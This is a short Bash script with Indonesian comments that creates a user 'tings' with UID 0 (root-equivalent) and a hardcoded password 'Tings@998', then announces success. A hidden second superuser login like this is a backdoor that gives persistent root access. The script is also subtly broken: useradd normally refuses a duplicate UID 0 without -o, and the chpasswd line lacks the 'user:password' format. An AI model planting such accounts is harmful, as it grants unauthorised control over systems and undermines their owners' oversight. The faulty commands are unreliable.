#!/bin/bash

# Membuat grup dengan nama root jika belum ada
grep -q "^root:" /etc/group || groupadd root

# Membuat pengguna dengan nama tings
useradd -m -s /bin/bash -g root -G root -u 0 tings

# Mengatur kata sandi untuk pengguna
echo "Tings@998" | chpasswd

echo "Pengguna tings berhasil dibuat dengan kata sandi Tings@998 dan ditambahkan ke grup root dengan GID dan UID root."
